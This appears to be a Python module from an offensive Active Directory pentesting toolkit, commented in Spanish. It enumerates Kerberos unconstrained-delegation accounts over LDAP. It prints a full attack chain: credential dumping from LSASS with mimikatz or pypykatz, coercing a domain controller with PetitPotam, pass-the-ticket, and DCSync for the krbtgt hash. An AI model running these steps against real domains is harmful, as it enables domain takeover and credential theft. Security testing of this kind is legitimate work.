# scripts/kerberos/delegation/unconstrained.py
#
# Técnica: Delegación No Restringida (Unconstrained Delegation)
#
# Fundamento:
#   Si una cuenta de equipo o de servicio tiene el flag
#   "Trusted for Delegation" (TrustedForDelegation=True, bit 0x80000 en
#   userAccountControl), cualquier usuario que se autentique CONTRA ese
#   servicio enviará su TGT al servicio junto con el ST.
#
#   El servicio almacena esos TGTs en memoria. Si el atacante compromete
#   el equipo con delegación no restringida:
#     - Puede extraer todos los TGTs de memoria (Mimikatz sekurlsa::tickets).
#     - Si logra que un DC se autentique contra su servicio (via PetitPotam,
#       PrinterBug, etc.), obtiene el TGT del DC → DCSync → krbtgt hash.
#
#   Por qué es tan peligroso:
#     Los DCs tienen TrustedForDelegation por defecto. Si comprometes un
#     servidor miembro con ese flag (a menudo servidores de ficheros, IIS),
#     tienes un pivote perfecto para coerción de DC.
#
#   Este script enumera los equipos vulnerables via LDAP.
#   La extracción de TGTs en memoria es una operación local en el equipo
#   comprometido (pypykatz / Mimikatz), no remota.

from scripts.base import BaseScript
from core.output import print_result, print_table, console
from core import session_db


class UnconstrainedDelegationScript(BaseScript):
    name = "unconstrained-deleg"
    description = "Enumera cuentas/equipos con Delegación No Restringida (TrustedForDelegation=True)"

    examples = [
        {"flag": "(uso básico)",
         "desc": "Requiere credenciales de dominio para la query LDAP.",
         "good": "kerberos --script=unconstrained-deleg -t 10.129.1.5 -d CORP.LOCAL -u jsmith -p 'Pass123!'",
         "bad": "kerberos --script=unconstrained-deleg -t 10.129.1.5 -d CORP.LOCAL  [sin -u/-p el LDAP anónimo rara vez devuelve userAccountControl]"},
    ]

    def run(self, **kwargs):
        realm = (self.creds.domain or self.target.domain or "").upper()
        kdc = self.target.ip

        if not realm: console.print("[red]Falta -d.[/red]"); return

        print_result("KRB", kdc, "info",
                     f"unconstrained-deleg: buscando cuentas con TrustedForDelegation en {realm}")

        results = self._ldap_query(kdc, realm)
        if not results:
            console.print("[dim]LDAP no disponible — implementa ldap.py o usa ldapsearch:[/dim]")
            console.print(f"  ldapsearch -H ldap://{kdc} -D '{self.creds.user}@{realm.lower()}' "
                           f"-w '{self.creds.password}' "
                           "\"(&(userAccountControl:1.2.840.113556.1.4.803:=524288)"
                           "(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))\""
                           " samAccountName")
            console.print()
            console.print("[bold yellow]Nota:[/bold yellow] Los DCs (bit 8192) siempre tienen "
                           "TrustedForDelegation — son ruido. El filtro de arriba los excluye.")
            return

        rows = [(r['samaccountname'], r['type'], r.get('os', '?')) for r in results]
        print_table(f"Cuentas con delegación no restringida ({realm})",
                     ["Cuenta", "Tipo", "OS"], rows)
        print_result("KRB", kdc, "pwned",
                     f"{len(results)} objetivo(s) con TrustedForDelegation")

        console.print()
        console.print("[bold yellow]Próximos pasos:[/bold yellow]")
        console.print("  1. Comprometer el equipo con TrustedForDelegation")
        console.print("  2. En el equipo comprometido: mimikatz sekurlsa::tickets /export")
        console.print("     o pypykatz lsa minidump lsass.dmp --kerberos-db")
        console.print("  3. Coerción de DC: PetitPotam → captura TGT del DC en memoria")
        console.print("  4. Pass-the-Ticket con el TGT del DC → DCSync → krbtgt hash")

        for r in results:
            session_db.save_finding(kdc, "KRB", "unconstrained_delegation",
                                     f"{r['samaccountname']} ({r['type']})")

    def _ldap_query(self, kdc, realm):
        try:
            from modules.ldap import LDAPModule
            from core.target import Target
            ldap = LDAPModule(Target(ip=kdc, domain=realm.lower()), self.creds)
            return ldap.get_unconstrained_delegation()
        except (ImportError, Exception):
            return []
